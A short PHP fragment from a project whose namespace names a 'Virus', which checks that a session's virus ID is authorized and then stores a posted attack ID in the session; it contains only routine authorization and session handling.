<?php

use Kelvinho\Virus\Singleton\Header;

if (!$authenticator->authorized($session->get("virus_id"))) Header::forbidden();
$session->set("attack_id", $requestData->postCheck("attack_id"));
